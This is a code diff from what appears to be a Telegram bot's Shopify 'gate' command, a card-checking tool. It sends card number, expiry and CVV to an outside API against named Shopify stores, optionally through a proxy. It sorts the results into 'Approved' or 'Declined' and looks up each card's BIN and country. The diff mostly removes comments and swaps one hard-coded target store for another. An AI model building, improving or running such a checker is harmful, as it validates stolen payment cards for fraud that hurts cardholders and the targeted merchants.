@@ -31,7 +31,7 @@ def _clean_site(raw: str) -> str:
 
 
 def load_sites() -> list[str]:
-    """Load Shopify target sites from sites.txt (one domain per line)."""
+    """Load Shopify target sites from sites.txt (one domain or URL per line)."""
     try:
         with open("sites.txt") as f:
             sites = [_clean_site(l) for l in f if l.strip() and not l.startswith("#")]
@@ -39,9 +39,8 @@ def load_sites() -> list[str]:
             return sites
     except FileNotFoundError:
         pass
-    # Hard-coded fallbacks — replace these with real sites in sites.txt
     return [
-        "1898-products.myshopify.com",
+        "aloracosmetics.myshopify.com",
         "anotherseasonwaco.myshopify.com",
     ]
 
@@ -113,10 +112,9 @@ async def call_shopii(cc: str, month: str, year: str, cvv: str,
     """
     GET goshopi.up.railway.app/shopii?cc=NUM|MM|YYYY|CVV&site=DOMAIN[&proxy=...]
 
-    Returns the FULL raw API response string — never modified, never filtered.
-    Raises on network error so the caller can show the real problem.
+    Returns the FULL raw API response — never filtered, never modified.
+    Raises on network error so caller shows the real problem.
     """
-    # API requires 4-digit year
     if len(year) == 2:
         year = "20" + year
 
@@ -128,7 +126,7 @@ async def call_shopii(cc: str, month: str, year: str, cvv: str,
         params["proxy"] = proxy
 
     timeout = aiohttp.ClientTimeout(
-        total=API_TIMEOUT,      # 120 s from config.py
+        total=API_TIMEOUT,
         connect=15,
         sock_read=API_TIMEOUT,
     )
@@ -148,8 +146,6 @@ async def call_shopii(cc: str, month: str, year: str, cvv: str,
         async with session.get(SHOPII_API, params=params) as resp:
             raw_bytes = await resp.read()
             raw_text  = raw_bytes.decode("utf-8", errors="replace").strip()
-
-            # Pretty-print if JSON, keep raw string otherwise
             try:
                 parsed   = json.loads(raw_text)
                 raw_text = json.dumps(parsed, ensure_ascii=False, separators=(",", ":"))
@@ -161,9 +157,8 @@ async def call_shopii(cc: str, month: str, year: str, cvv: str,
 
 def _readable_resp(raw: str) -> str:
     """
-    Pull the human-readable message from the API JSON.
-    Falls back to the full raw string if it's not JSON
-    or none of the known keys exist.
+    Extract the human-readable message from the API JSON response.
+    Returns the full raw string if it is not JSON or no known key found.
     """
     try:
         d = json.loads(raw)
@@ -171,7 +166,6 @@ def _readable_resp(raw: str) -> str:
                     "category", "status", "msg", "detail", "error"):
             if key in d and d[key] not in (None, "", False):
                 return str(d[key]).strip()
-        # If no known key found, return full compact JSON
         return raw
     except Exception:
         return raw
@@ -180,7 +174,7 @@ def _readable_resp(raw: str) -> str:
 def classify(resp_text: str) -> str:
     """
     "APPROVED" / "DECLINED" / "UNKNOWN"
-    Only reads what the API actually returned — never assumes.
+    Reads only what the API actually returned — never assumes.
     """
     t = resp_text.lower()
     for kw in ("approved", "approval", "success", "charged", "captured",
@@ -202,19 +196,16 @@ def classify(resp_text: str) -> str:
 async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
 
-    # Maintenance
     if context.bot_data.get("maintenance") and user.id != OWNER_ID:
         await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
         return
 
-    # Gate toggle
     if not context.bot_data.get("sh_on", True):
         await update.message.reply_text(
             f"{E_DECLINED} Sʜᴏᴘɪꜰʏ gate is currently <b>OFF</b>.", parse_mode="HTML"
         )
         return
 
-    # Force-join
     not_joined = await _check_force_sub(user.id, context)
     if not_joined:
         rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
@@ -306,11 +297,10 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if isinstance(api_result, Exception):
             raise api_result
 
-        raw_response = api_result                        # full, real, unmodified
-        display_resp = _readable_resp(raw_response)      # human-readable extracted field
+        raw_response = api_result
+        display_resp = _readable_resp(raw_response)
         status       = classify(display_resp)
 
-        # Status label
         if status == "APPROVED":
             status_ui = f"{E_LIVE} Aᴘᴘʀᴏᴠᴇᴅ ✅"
         elif status == "DECLINED":
@@ -318,7 +308,6 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             status_ui = f"{E_ERRORS} Uɴᴋɴᴏᴡɴ ⚠️"
 
-        # BIN
         bin_txt = "N/A"
         country = "N/A"
         flag    = ""
